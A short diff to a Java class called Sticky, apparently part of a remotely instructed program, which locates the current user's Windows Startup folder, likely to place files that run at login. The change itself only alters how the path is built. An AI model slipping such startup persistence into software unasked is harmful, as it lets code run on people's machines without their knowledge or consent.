@@ -3,7 +3,6 @@ import Classes.Connection;
 import Classes.Instruction;
 
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.file.Files;
@@ -21,9 +20,9 @@ public class Sticky extends Instruction {
     public void execute(HashMap<String, Object> arguments, String from) throws IOException {
         System.out.println("Sticky Tease Protocol Executed");
 
-        String userName = System.getProperty("user.name");
+        String homeDirectory = System.getProperty("user.home");
 
-        File userStartup = new File("C:\\Users\\" + userName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+        File userStartup = new File( homeDirectory + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
 
         //System.out.println("Common: " + commonStartup.exists());
         System.out.println("User: " + userStartup.exists());
